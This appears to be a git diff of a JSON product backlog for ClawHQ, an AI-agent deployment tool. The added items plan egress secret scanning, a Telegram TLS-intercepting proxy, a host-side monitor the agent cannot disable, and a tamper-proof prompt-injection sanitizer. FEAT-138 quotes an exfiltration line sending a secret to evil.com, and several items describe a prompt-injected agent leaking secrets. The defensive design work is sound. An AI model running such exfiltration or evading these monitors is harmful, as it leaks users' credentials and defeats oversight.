@@ -2,216 +2,6 @@
   "description": "ClawHQ backlog — aligned with evolved strategy (2026-03-28). See docs/STRATEGY.md for strategic context.",
   "items": [
     {
-      "id": "FEAT-122",
-      "title": "Sentinel monitoring service — upstream intelligence that a cron job can't replicate",
-      "intent": "ClawHQ must have a day-one revenue hypothesis. Sentinel is a paid monitoring service that provides upstream intelligence — pre-computing config breakage against incoming OpenClaw commits, tracking CVE impact per blueprint, and alerting on skill dependency changes. This must do something a local cron job cannot.",
-      "description": "The evolved strategy requires testing revenue from day one, not deferring it. Sentinel is the hypothesis: ~$19/month monitoring that enhances sovereignty rather than compromising it. CRITICAL DESIGN CONSTRAINT: this must NOT be 'clawhq doctor --watch' as a service — that's replicable with a cron job and the sovereignty audience will call it out immediately. The value is upstream intelligence: (1) monitor OpenClaw GitHub commits and pre-compute whether your specific config will break before you update, (2) track new CVEs and map them to your installed skills/tools, (3) detect when upstream dependencies of your skills change, (4) aggregate anonymized health signals across the fleet to identify emerging issues before they hit you. Phase 1 (MVP): OpenClaw commit monitoring + config breakage prediction. Phase 2: CVE mapping + skill dependency tracking.",
-      "priority": "should",
-      "category": "revenue",
-      "steps": [
-        "Design Sentinel architecture: upstream monitor (GitHub API polling), config analyzer (diff against user's blueprint), alert delivery (email/webhook)",
-        "Implement OpenClaw commit monitor: poll GitHub API for new commits to main, parse changed files, identify config-impacting changes",
-        "Implement config breakage predictor: given a commit diff and a user's compiled config, determine if the update would break their deployment",
-        "Implement alert system: email or webhook notification with specific breakage details and recommended action",
-        "Design pricing page / signup flow for revenue validation",
-        "Build minimal web endpoint for Sentinel subscription management",
-        "Add clawhq cloud sentinel connect command to link a deployment to Sentinel",
-        "Phase 2: CVE tracker that maps advisories to user's specific skill/tool inventory"
-      ],
-      "acceptanceCriteria": [
-        "Sentinel monitors OpenClaw upstream commits and identifies config-impacting changes",
-        "Users receive alerts BEFORE updating when a new release would break their specific config",
-        "Alert includes: what changed upstream, what would break in their config, recommended action",
-        "Service provides value that a local cron job cannot replicate (upstream intelligence, not local health checks)",
-        "Pricing page exists and accepts signups for revenue validation",
-        "Revenue signal measurable within 30 days of announcement"
-      ],
-      "scope": [
-        "src/cloud/",
-        "src/config/"
-      ],
-      "status": "done",
-      "readyForSprint": false,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: Phase 1 only. GitHub API polling (commits to openclaw main), config diff engine (compare commit changes against user blueprint compiled config), webhook alert delivery. Minimal Express endpoint for subscription management. No pricing page in Phase 1 — free tier validates demand. clawhq cloud sentinel connect stores webhook URL.",
-      "passes": true,
-      "completedAt": "2026-03-30T14:12:15-07:00"
-    },
-    {
-      "id": "FEAT-112",
-      "title": "Construct meta-skill — autonomous self-improvement loop for agent capability growth",
-      "intent": "Agents must grow their capabilities over time without manual intervention. The construct skill is the mechanism: assess gaps → propose new skills → build → deploy → validate. This is THE differentiator for the 'agent grows' pillar.",
-      "description": "Clawdius has a 'construct' skill that runs daily at 2am PT. Over 3 months it has autonomously built 7 skills. ClawHQ's skill system supports install/remove/update but has no autonomous growth mechanism.",
-      "priority": "should",
-      "category": "core",
-      "steps": [
-        "Design construct skill config for ClawHQ: SKILL.md, state machine (assess/propose/build/deploy/validate), cron schedule",
-        "Add construct to configs/skills/ as a built-in skill",
-        "Implement state persistence (construct tracks what it has assessed, proposed, built)",
-        "Wire construct into blueprint cron_config as an optional daily job",
-        "Add skill vetting integration — construct-built skills must pass the same vetting as manually installed skills",
-        "Add construct to 'replace-my-pa', 'founders-ops', and 'research-copilot' blueprints by default",
-        "Add tests for state machine transitions and skill output validation"
-      ],
-      "acceptanceCriteria": [
-        "Construct skill is available as a built-in skill in configs/skills/",
-        "Construct follows Assess→Propose→Build→Deploy→Validate cycle",
-        "Construct-built skills pass the same vetting pipeline as manually installed skills",
-        "State is persisted across runs (no redundant assessments)",
-        "Blueprints can opt-in to construct via skill_bundle configuration",
-        "At least 3 blueprints include construct by default"
-      ],
-      "scope": [
-        "configs/skills/",
-        "configs/blueprints/",
-        "src/evolve/skills/"
-      ],
-      "status": "done",
-      "readyForSprint": false,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: construct-built skills call vetSkill() from src/evolve/skills/. State in workspace/.construct-state.json. Assessed items tracked by ID+timestamp to avoid repeats.",
-      "passes": true,
-      "completedAt": "2026-03-30T15:07:40-07:00"
-    },
-    {
-      "id": "FEAT-120",
-      "title": "Operational automation scripts — auto-update, security monitoring, workspace backup generation",
-      "intent": "A deployed agent must maintain itself. Auto-updates, security advisory monitoring, and workspace backups should be generated by ClawHQ, not hand-written by the operator.",
-      "description": "Clawdius has 24 operational scripts. ClawHQ has doctor and backup commands but does not generate the operational automation layer.",
-      "priority": "should",
-      "category": "operate",
-      "steps": [
-        "Generate auto-update script during clawhq init",
-        "Generate security monitor script (checks GitHub Security Advisories for OpenClaw CVEs)",
-        "Generate workspace backup script (incremental rsync to configurable backup dir)",
-        "Generate systemd unit files for firewall watcher and backup timer",
-        "Add clawhq ops install command to deploy generated scripts and timers",
-        "Add doctor checks: auto-update timer active, backup recent, security monitor running"
-      ],
-      "acceptanceCriteria": [
-        "clawhq init generates operational scripts in the deployment directory",
-        "clawhq ops install deploys scripts as systemd timers/services",
-        "Auto-update runs on configurable schedule (default: daily)",
-        "Security monitor checks GitHub Advisories and alerts on critical/high CVEs",
-        "Workspace backup runs on configurable schedule with retention policy",
-        "clawhq doctor reports operational automation status"
-      ],
-      "scope": [
-        "src/design/configure/",
-        "src/operate/",
-        "src/cli/"
-      ],
-      "status": "done",
-      "readyForSprint": false,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: systemd units use clawhq-<instance>-<service>.timer naming from deploy dir basename. Multi-instance safe. No shared state.",
-      "passes": true,
-      "completedAt": "2026-03-30T15:28:19-07:00"
-    },
-    {
-      "id": "FEAT-116",
-      "title": "Domain-based egress firewall with ipset — upgrade from IP-based iptables to DNS-resolved allowlists",
-      "intent": "Agent egress must be restricted to explicitly allowed domains, not IP addresses. IP-based rules miss CDN rotations, multi-homed services, and IPv6.",
-      "description": "ClawHQ's firewall module uses IP-based iptables rules. Clawdius uses domain-based egress: a domain allowlist resolved via DNS into an ipset, refreshed every 5 minutes.",
-      "priority": "should",
-      "category": "Security",
-      "steps": [
-        "Add domain-allowlist concept to blueprint security_posture",
-        "Generate domain allowlist file from blueprint egress config during clawhq init",
-        "Implement ipset creation from domain allowlist",
-        "Update firewall module to use ipset match rules instead of per-IP iptables rules",
-        "Generate refresh mechanism for periodic DNS re-resolution",
-        "Add doctor check: ipset exists, not stale, matches allowlist",
-        "Add tests for domain resolution, ipset creation, stale detection"
-      ],
-      "acceptanceCriteria": [
-        "Blueprint security posture includes a domain allowlist",
-        "clawhq up creates an ipset from DNS resolution of the allowlist",
-        "iptables rules reference the ipset, not individual IP addresses",
-        "A refresh mechanism keeps the ipset current",
-        "clawhq doctor detects stale ipsets",
-        "clawhq down removes the ipset and iptables rules cleanly"
-      ],
-      "scope": [
-        "src/build/launcher/firewall.ts",
-        "src/operate/doctor/",
-        "configs/blueprints/"
-      ],
-      "status": "done",
-      "readyForSprint": false,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: ipset named clawhq_<instance>_egress per deploy dir basename. clawhq down destroys ipset. No shared state between instances. Multi-instance safe by construction.",
-      "passes": true,
-      "completedAt": "2026-03-30T15:50:43-07:00"
-    },
-    {
-      "id": "FEAT-022",
-      "title": "Integration tests for credential probes — test against real API endpoints with test keys",
-      "intent": "Credential health probes are tested with mocked fetch. If an API changes its auth error response, our probe will misinterpret it. Real probes against real APIs must be tested.",
-      "description": "Live probe tests that run when test API keys are available. Ollama probe can always run locally.",
-      "priority": "could",
-      "category": "testing",
-      "steps": [
-        "Add integration test: src/secure/credentials/probes.integration.test.ts",
-        "For each probe: if env var with test key is set, run real probe",
-        "Ollama probe can always run if Ollama is installed locally",
-        "Validate: probe returns valid:true for good keys, valid:false for bad keys",
-        "Skip gracefully when no test keys are available"
-      ],
-      "acceptanceCriteria": [
-        "Live probe tests run against real APIs when test credentials are available",
-        "Ollama probe runs against local Ollama when available",
-        "Tests skip gracefully when no credentials are provided",
-        "Existing mock-based unit tests remain unchanged"
-      ],
-      "scope": [
-        "src/secure/credentials/probes.ts"
-      ],
-      "status": "done",
-      "readyForSprint": false,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Lower priority — probe API calls are simple HTTP and unlikely to break. Quick win for Ollama probe.",
-      "lastFailAt": "2026-03-24T23:20:05-07:00",
-      "failCount": 1,
-      "passes": true,
-      "completedAt": "2026-03-31T16:45:56-07:00"
-    },
-    {
-      "id": "FEAT-117",
-      "title": "Stoic coach personality blueprint — purpose-built agent for philosophical mentorship",
-      "intent": "The stoic coach blueprint proves ClawHQ can forge agents with deep personality — not just task automation, but genuine character. This is the blueprint that makes people say 'this is different from ChatGPT'.",
-      "description": "Extract Clawdius's stoic identity patterns into a 'Stoic Coach' blueprint. Part of the '10 curated blueprints' strategy — this is blueprint #8.",
-      "priority": "could",
-      "category": "blueprints",
-      "steps": [
-        "Create configs/blueprints/stoic-coach.yaml",
-        "Define personality: high analyticalDepth, moderate warmth, high directness, low verbosity",
-        "Define customization questions: philosophical tradition, practice times, accountability style",
-        "Define toolbelt: journal (append-only markdown), reflection-prompt generator",
-        "Define skills: daily-stoic (morning prompt + evening reflection), weekly-review",
-        "Define cron, autonomy, and memory policy",
-        "Test: clawhq init --guided with stoic-coach produces a deployable agent config"
-      ],
-      "acceptanceCriteria": [
-        "stoic-coach.yaml is a complete blueprint with all required sections",
-        "Personality dimensions are distinct from other blueprints",
-        "Blueprint includes at least one unique tool and one unique skill",
-        "clawhq init --guided with stoic-coach produces a deployable agent config",
-        "The forged agent has a distinctive voice — tested by reading generated SOUL.md"
-      ],
-      "scope": [
-        "configs/blueprints/",
-        "configs/skills/",
-        "src/design/tools/"
-      ],
-      "status": "done",
-      "readyForSprint": false,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: journal tool is append-only markdown writer (workspace/journal/YYYY-MM-DD.md). daily-stoic skill uses morning prompt + evening reflection cron pattern from existing morning-brief. Blueprint #11 (10 exist after FEAT-126). Sprint-ready.",
-      "passes": true,
-      "completedAt": "2026-03-31T17:06:13-07:00"
-    },
-    {
       "id": "FEAT-114",
       "title": "JMAP email backend — FastMail-compatible email tool as alternative to himalaya/IMAP",
       "intent": "Users on FastMail (or any JMAP provider) must have a native email tool that uses JMAP instead of IMAP.",
@@ -238,8 +28,8 @@
       ],
       "status": "todo",
       "readyForSprint": true,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: JMAP backend is a separate generated script (email-jmap.py). email.ts tool generator takes backend param (himalaya|jmap). Account switching via --account flag routes to correct backend. No coexistence issue — one backend per account."
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "email.ts confirmed: generates himalaya bash wrapper only. Integration AC: generateEmailTool() must accept backend param (not a separate function) — consistent API. Doctor check integration is a secondary deliverable but needed for completeness. Generated Python must use only json, urllib, sys, os from stdlib — no requests/httpx. Account routing via --account flag maps to different script (himalaya vs email-jmap.py), not a single polyglot script."
     },
     {
       "id": "FEAT-119",
@@ -267,108 +57,8 @@
       ],
       "status": "todo",
       "readyForSprint": true,
-      "groomedAt": "2026-03-28",
-      "groomingNotes": "Design resolved: news tool wraps tavily + x tools. Dedup via URL hash set in news-state.json. Budget via max_calls_per_scan config. No new external deps needed — uses existing tool generators as backends."
-    },
-    {
-      "id": "FEAT-128",
-      "title": "Approval gates in identity generation — three-tier execute/propose/approve delegation model",
-      "intent": "An agent with autonomy settings but no concrete action-level delegation rules will either over-ask or over-act. Generated AGENTS.md must include explicit approval gates with per-action examples.",
-      "description": "Clawdius recon (2026-03-29): AGENTS.md has three-tier approval model with concrete per-action examples. ClawHQ generateAgents() only outputs tools/skills inventory.",
-      "priority": "should",
-      "category": "core",
-      "steps": [
-        "Extend blueprint autonomy_model with per-action delegation defaults",
-        "Update generateAgents() in src/design/identity/agents.ts to emit approval gates section",
-        "Add heartbeat behavior patterns section",
-        "Add communication rules section",
-        "Add tests: each autonomy level produces correct delegation tiers"
-      ],
-      "acceptanceCriteria": [
-        "Generated AGENTS.md includes three-tier approval gates with per-action examples",
-        "Autonomy level (low/medium/high) maps to different delegation defaults",
-        "Heartbeat behavior patterns documented in generated AGENTS.md"
-      ],
-      "scope": [
-        "src/design/identity/",
-        "configs/blueprints/"
-      ],
-      "dependsOn": [],
-      "status": "done",
-      "passes": true,
-      "readyForSprint": false,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "Sprint-ready after codebase analysis. generateAgents() in src/design/identity/agents.ts is 78 lines — confirmed gap: emits only name/role/tools/skills/autonomy-list. Missing: three-tier delegation (execute/propose/approve), per-action examples, heartbeat behavior section, communication rules. Blueprint autonomy_model must be extended with delegation_defaults[]. Implementation: (1) extend Blueprint type with delegation_defaults field, (2) add generateDelegationGates() function, (3) emit 3-section Approval Gates block in generateAgents(), (4) add test file. Scope is contained: agents.ts + blueprint types + tests. Autonomy level mapping: low=approve-most, medium=balanced, high=execute-most.",
-      "completedAt": "2026-03-29T23:14:55-07:00"
-    },
-    {
-      "id": "FEAT-129",
-      "title": "Credential proxy architecture — host-side token proxy so secrets never enter the container",
-      "intent": "Storing API tokens inside the agent container is a single-exploit-away from credential theft. A host-side credential proxy means the container never holds tokens.",
-      "description": "Clawdius recon (2026-03-29): cred-proxy on Docker bridge holds all API tokens on host, injects auth headers. ClawHQ has src/secure/credentials/ but no proxy architecture.",
-      "priority": "should",
-      "category": "Security",
-      "steps": [
-        "Design credential proxy service: Docker sidecar, route definitions, header injection",
-        "Add routes.json schema",
-        "Generate cred-proxy docker-compose service during clawhq init",
-        "Update tool generators to call cred-proxy URL",
-        "Add audit logging for proxied requests",
-        "Add doctor check: cred-proxy reachable, routes healthy"
-      ],
-      "acceptanceCriteria": [
-        "Credential proxy runs as host-side sidecar",
-        "API tokens never in agent container",
-        "Generated tools call proxy URL",
-        "Proxied requests audit-logged",
-        "clawhq doctor checks proxy health"
-      ],
-      "scope": [
-        "src/secure/credentials/",
-        "src/build/docker/",
-        "src/design/tools/"
-      ],
-      "dependsOn": [],
-      "status": "done",
-      "passes": true,
-      "readyForSprint": false,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "Design resolved: Docker sidecar on bridge (172.x.0.1:8900). routes.json: {tool: {backend_url, auth_header, token_env_var}}. Tools use CRED_PROXY_URL. /health for liveness. Doctor checks proxy reachable.",
-      "completedAt": "2026-03-30T16:47:23-07:00"
-    },
-    {
-      "id": "FEAT-130",
-      "title": "Delegated action rules — blueprint-level pre-approved action categories with pattern matching",
-      "intent": "Users must define what their agent can do without asking. Email delegation is the first use case but the pattern generalizes.",
-      "description": "Clawdius recon (2026-03-29): delegated-send-rules.json defines pre-approved categories. ClawHQ has no action-level delegation config.",
-      "priority": "should",
-      "category": "core",
-      "steps": [
-        "Design delegated-action-rules schema",
-        "Add delegation_rules to blueprint spec",
-        "Implement rule generation during init",
-        "Generate delegated-rules.json in workspace",
-        "Add email delegation defaults to email-manager blueprint",
-        "Add tests"
-      ],
-      "acceptanceCriteria": [
-        "Blueprints can define delegated action rules per tool",
-        "Generated workspace includes delegated-rules.json",
-        "Email-manager ships with email delegation defaults",
-        "Rules support pattern matching"
-      ],
-      "scope": [
-        "src/design/blueprints/",
-        "src/design/configure/",
-        "configs/blueprints/"
-      ],
-      "dependsOn": [],
-      "status": "done",
-      "passes": true,
-      "readyForSprint": false,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "Confirmed: Blueprint interface has no delegation_rules field. generate.ts does not emit delegated-rules.json. Implementation path: (1) Design delegated-action-rules schema — per-tool rule entries with: action name, pattern (glob or regex), auto_approve bool, escalation_contact optional. Add DelegationRules interface to src/design/blueprints/types.ts. (2) Add optional delegation_rules field to Blueprint interface. (3) Add rule generation to generate.ts: compile blueprint.delegation_rules into workspace/delegated-rules.json during init. (4) Add email-manager defaults: auto-approve read/triage/label, escalate send/delete/forward-external. (5) Tests: email-manager blueprint generates delegated-rules.json with expected entries; pattern matching test (glob-based action names). Sprint-ready: all scope files exist, no external dependencies, no ipset or Docker required.",
-      "completedAt": "2026-03-30T18:34:05-07:00"
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "News tool wraps tavily and x tool generators as backends. Dedup via URL hash set in news-state.json. Budget via max_calls_per_scan config field per backend. FEAT-131 (interest graph) must be done first — news tool filters by interests.json topics. Integration AC: both index.ts export and blueprint YAML references required — just having news.ts is not enough."
     },
     {
       "id": "FEAT-131",
@@ -398,74 +88,8 @@
       "status": "todo",
       "passes": false,
       "readyForSprint": true,
-      "groomedAt": null,
-      "groomingNotes": "Design resolved: interests.json schema: {topics: [{id, label, priority, frequency, sources: {x_handles?, tavily_queries?, substack_pubs?}}]}. Blueprint spec gets optional interests section. interests CLI tool: add/remove/list/prioritize."
-    },
-    {
-      "id": "FEAT-132",
-      "title": "Per-blueprint domain egress allowlists — blueprint-aware firewall defaults",
-      "intent": "Each blueprint knows what services it needs. Firewall allowlist should be generated from the blueprint.",
-      "description": "Clawdius recon (2026-03-29): domain allowlist per integration. FEAT-116 covers ipset but not per-blueprint defaults.",
-      "priority": "should",
-      "category": "Security",
-      "steps": [
-        "Map integration types to required domains",
-        "Add domain_allowlist generation to generate.ts",
-        "Compile integrations+tools to allowlist",
-        "Generate allowlist file during init",
-        "Add doctor check for missing domains"
-      ],
-      "acceptanceCriteria": [
-        "Each blueprint compiles to a domain allowlist",
-        "clawhq init generates allowlist automatically",
-        "Doctor detects missing domains"
-      ],
-      "scope": [
-        "src/build/launcher/firewall.ts",
-        "src/design/configure/",
-        "configs/blueprints/"
-      ],
-      "dependsOn": [
-        "FEAT-116"
-      ],
-      "status": "done",
-      "passes": true,
-      "readyForSprint": false,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "NOT BLOCKED BY FEAT-116. This item uses existing domain-based iptables rules already in firewall.ts — no ipset needed. FEAT-116 dependency is for the future periodic DNS-refresh upgrade only; this item is unblocked. dependsOn field will be cleared when CLI supports it. Implementation: in generate.ts, iterate blueprint.security_posture.egress_domains and emit allowlist.yaml (default port 443, MTA domains get 587/465). Add doctor check: each blueprint domain must exist in allowlist.yaml.",
-      "completedAt": "2026-03-31T14:55:08-07:00"
-    },
-    {
-      "id": "FEAT-133",
-      "title": "ClawWall coverage parity — audit sanitizer against Clawdius production firewall",
-      "intent": "ClawHQ sanitizer must match or exceed battle-tested production firewall. Gaps mean real injection vectors.",
-      "description": "Clawdius recon (2026-03-29): sanitize.py 1,329 lines, OWASP LLM01 Tier 1+2. ClawHQ has src/secure/sanitizer/ — audit delta.",
-      "priority": "should",
-      "category": "Security",
-      "steps": [
-        "Catalog Clawdius sanitize.py detection patterns",
-        "Catalog ClawHQ sanitizer coverage",
-        "Identify gaps",
-        "Implement missing patterns",
-        "Add test cases"
-      ],
-      "acceptanceCriteria": [
-        "All detection categories covered",
-        "OWASP LLM01 Tier 1+2 tested",
-        "Obfuscation detection covered",
-        "No regression"
-      ],
-      "scope": [
-        "src/secure/sanitizer/",
-        "src/design/tools/sanitize.ts"
-      ],
-      "dependsOn": [],
-      "status": "done",
-      "passes": true,
-      "readyForSprint": false,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "Gap analysis complete: 11 gaps found. P0: egress secret scanning (last line of data sovereignty defense), indirect elicitation (credential leak via social engineering). P1: semantic override, soft instruction override, leetspeak normalization, extended unicode. P2: split-payload detection, context poisoning, self-integrity. P3: Q/A few-shot, LLM classifier (future). Sprint plan: P0 gaps first, then P1.",
-      "completedAt": "2026-03-31T15:52:55-07:00"
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "No interests infrastructure exists anywhere in the codebase — clean slate. interests.json schema: array of InterestTopic objects with topic, priority, frequency, sources. Tool generator produces a shell script or JS script for runtime management (add/remove/list topics). Blueprint types.ts gets optional interests field. Integration AC: configure/generate.ts must call the tool generator and write interests.json — the tool must be wired into the init path, not just defined. FEAT-119 (news tool) depends on this item."
     },
     {
       "id": "FEAT-134",
@@ -494,8 +118,8 @@
       "status": "todo",
       "passes": false,
       "readyForSprint": true,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "Codebase analysis: src/config/validate.ts exists, validate.test.ts exists. FEAT-113 added model routing per cron job. This item validates those defaults against Clawdius production patterns (haiku for fast, sonnet for medium, opus for complex). Implementation: (1) Document Clawdius model map in groomingNotes for reference: morning-brief=haiku, triage=haiku, market-scan=sonnet, construct=opus. (2) Update blueprint cron_config model assignments where wrong. (3) Add validate.ts rule: warn if cron schedule is sub-hourly (<=60min) and model is opus or sonnet."
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "FEAT-113 added model routing per cron job. validate.ts exists (src/config/validate.ts), validate.test.ts exists. Blueprint YAML files confirmed in configs/blueprints/. Sub-hourly threshold = schedule interval <=60 minutes. Integration AC: validateAll() must call validateModelRouting() — grep proves wiring. The function must return ValidationResult[] consistent with existing LM validators. 11 blueprints have cron, target is at minimum the 7 core ones. Use WARN not ERROR for cost inefficiency (non-fatal)."
     },
     {
       "id": "FEAT-135",
@@ -524,8 +148,396 @@
       "status": "todo",
       "passes": false,
       "readyForSprint": true,
-      "groomedAt": "2026-03-29",
-      "groomingNotes": "Sprint-ready after codebase analysis. generateSoul() in src/design/identity/soul.ts is 160 lines — confirmed gap: generates dimension prose (analyticalDepth, warmth, directness, verbosity, proactivity, creativity, structure) but no execution_philosophy section. The proactivity dimension (lines 26-41) is already computed — execution philosophy should map proactivity<=2 to 'ask before act', proactivity>=4 to 'silence is competence'. Guardian model section should be added for autonomy_model.default=high blueprints. Implementation: add generateExecutionPhilosophy(blueprint) helper, add guardian model conditional, wire into main generateSoul() output, add tests. Scope: soul.ts only. Token budget must still pass — add token budget test assertion."
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "Confirmed gap: generateDimensionSoul() has no execution_philosophy section. proactivity dimension (1-5) already computed in renderAllDimensionsProse(). Implementation: add generateExecutionPhilosophy(blueprint, dimensions) helper in soul.ts, call it from generateDimensionSoul() after prose sections, append output to sections array. Guardian model block guarded on autonomy_model.default==='high'. Token budget identity.test.ts must still pass. Integration AC: grep for generateExecutionPhilosophy call in soul.ts proves wiring."
+    },
+    {
+      "id": "FEAT-136",
+      "title": "Telegram egress proxy — MITM secret scanning for outbound messages",
+      "intent": "An agent sending Telegram messages must never be able to exfiltrate secrets via message text or captions. The current firewall allows api.telegram.org but does not inspect message content. A prompt-injected agent could encode secrets in replies.",
+      "description": "Clawdius battle-tested pattern: redirect api.telegram.org to a host-side HTTPS reverse proxy via extra_hosts in docker-compose.yml. The proxy terminates TLS (self-signed CA trusted via NODE_EXTRA_CA_CERTS), inspects sendMessage/editMessageText/sendPhoto payloads for secret patterns (env var values, base64 variants, token regexes), and either forwards clean messages or replaces dirty ones with '[EGRESS BLOCKED]' + alerts the user. Implementation: (1) generate telegram-egress-proxy.py (stdlib Python, ~600 lines), (2) generate self-signed CA + server cert, (3) add extra_hosts and NODE_EXTRA_CA_CERTS to compose generation, (4) add systemd service for the proxy. Reference: clawdius/scripts/cred-proxy/telegram-egress-proxy.py.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add telegram-egress-proxy.py generator to src/secure/ (port from Clawdius reference)",
+        "Add cert generation script (gen-telegram-certs.sh) to ops tooling",
+        "Update compose generator: add extra_hosts redirecting api.telegram.org to bridge IP",
+        "Update compose generator: add NODE_EXTRA_CA_CERTS env var pointing to proxy CA",
+        "Add systemd service generator for the proxy",
+        "Add doctor check: proxy running, cert valid, scan test passes",
+        "Add to all blueprints that enable Telegram channel"
+      ],
+      "acceptanceCriteria": [
+        "Telegram messages are routed through the egress proxy when Telegram channel is configured",
+        "Proxy scans text/caption fields for env var values, base64 variants, and token patterns",
+        "Messages containing secrets are replaced with [EGRESS BLOCKED] and audit-logged",
+        "clawhq doctor verifies proxy health and cert validity"
+      ],
+      "scope": ["src/secure/", "src/build/docker/compose.ts", "src/operate/doctor/"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. This is the single biggest security gap — Telegram is the primary exfiltration channel and currently has zero content inspection. Clawdius's implementation is battle-tested (running since SEC-024). Size M-L."
+    },
+    {
+      "id": "FEAT-137",
+      "title": "Post-hoc Telegram monitor — host-side secret scanner the agent cannot disable",
+      "intent": "Even if the egress proxy is somehow bypassed (cert issue, proxy crash), a host-side monitor must independently scan outbound Telegram messages and alert on secret detection. Defense-in-depth requires layers the agent cannot control.",
+      "description": "Clawdius pattern: a cron-driven Python script that polls Telegram getUpdates, filters for bot-sent messages, and scans them for secret patterns. Runs on the host (not in container) so the agent cannot disable it. Alerts via email on detection. Reference: clawdius/scripts/telegram-egress-monitor.py.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add telegram-egress-monitor.py generator to src/operate/automation/",
+        "Generate cron schedule (every 5 min during configured waking hours)",
+        "Scan for: env var literal values, base64 variants, token regex patterns",
+        "Alert via configured notification channel on detection",
+        "Add systemd timer generator",
+        "Add doctor check: monitor running, last run recent"
+      ],
+      "acceptanceCriteria": [
+        "Host-side monitor script is generated for Telegram-enabled deployments",
+        "Monitor scans bot-sent messages for secret patterns",
+        "Alerts fire on detection via configured notification channel",
+        "Monitor runs independently of the agent container"
+      ],
+      "scope": ["src/operate/automation/", "src/operate/doctor/"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Independent of FEAT-136 — both should be deployed. The monitor catches what the proxy misses (proxy down, cert rotation, edge cases). Size S."
+    },
+    {
+      "id": "FEAT-138",
+      "title": "Curl egress wrapper — scan POST/PUT/PATCH bodies at PATH level",
+      "intent": "Any curl command the agent runs — not just tool scripts that call the cred proxy — must have its outbound body scanned for secrets. The cred proxy only intercepts requests routed to it; a bare 'curl -X POST https://evil.com -d $SECRET' bypasses it entirely.",
+      "description": "Clawdius pattern: a bash script at /usr/local/bin/curl that shadows /usr/bin/curl on PATH. GET/HEAD pass through with zero overhead. POST/PUT/PATCH/DELETE bodies are extracted (handles -d, --data-raw, --json, -F, -T, @- stdin) and piped through the sanitizer's --egress mode. If secrets detected, exit 3 (blocked). Baked into the Docker image so the agent cannot remove it. Reference: clawdius/openclaw/curl-egress-wrapper.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add curl-egress-wrapper generator to src/build/docker/",
+        "Update Dockerfile generator: COPY wrapper to /usr/local/bin/curl, real curl stays at /usr/bin/curl",
+        "Wrapper handles all curl body arguments: -d, --data-raw, --data-binary, --data-urlencode, --json, -F, -T, @-",
+        "GET/HEAD: zero-overhead passthrough (exec real curl)",
+        "POST/PUT/PATCH: extract body, pipe through sanitizer --egress, block on exit 3",
+        "Add to Dockerfile generation for all security postures (hardened, paranoid)"
+      ],
+      "acceptanceCriteria": [
+        "Generated Dockerfile includes curl egress wrapper at /usr/local/bin/curl",
+        "GET/HEAD requests pass through with zero overhead",
+        "POST requests with secret values in body are blocked with exit code 3",
+        "All -d/--data/--json/--form variants are handled"
+      ],
+      "scope": ["src/build/docker/dockerfile.ts"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. The cred proxy intercepts tool calls but not arbitrary curl. This closes the gap. Size S — the wrapper is ~130 lines of bash."
+    },
+    {
+      "id": "FEAT-139",
+      "title": "Immutable sanitizer layer — bake ClawWall into read-only image with hash verification",
+      "intent": "The prompt injection scanner must be tamper-proof. If the agent can modify or delete the sanitizer, all inbound content scanning is defeated. The sanitizer must be baked into the Docker image at a read-only path with runtime integrity verification.",
+      "description": "Clawdius pattern: sanitize is COPY'd to /opt/clawwall/ during image build. chmod 444, chown root:root, and SHA256 hash computed and stored alongside. At runtime, every invocation verifies its own hash against the baked-in expected hash — fail-closed if tampered. The workspace copy is separate (for agent-initiated updates) but the /opt/clawwall/ copy is immutable. Reference: clawdius/openclaw/Dockerfile lines 152-162.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Update Dockerfile generator: COPY sanitizer to /opt/clawwall/sanitize and /opt/clawwall/sanitize.py",
+        "Add sha256sum step at build time, store hash at /opt/clawwall/sanitize.sha256",
+        "Set permissions: chmod 555 /opt/clawwall/, chmod 444 on files, chown root:root",
+        "Add self-integrity check to sanitizer: verify hash on every invocation, fail-closed on mismatch",
+        "Update tool generators: tools import from /opt/clawwall/ (immutable) not workspace (mutable)",
+        "Add doctor check: verify /opt/clawwall/ exists and hash matches"
+      ],
+      "acceptanceCriteria": [
+        "Generated Dockerfile bakes sanitizer into /opt/clawwall/ with root ownership and 444 permissions",
+        "SHA256 hash is computed at build time and stored alongside",
+        "Sanitizer verifies its own integrity on every invocation",
+        "Integrity check failure causes fail-closed abort (not silent passthrough)"
+      ],
+      "scope": ["src/build/docker/dockerfile.ts", "src/secure/sanitizer/"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Currently the sanitizer runs on the ClawHQ host, not in-container. This adds an immutable in-container copy for tools that need inline scanning. Size S-M."
+    },
+    {
+      "id": "FEAT-140",
+      "title": "Trivy image scanning in build pipeline",
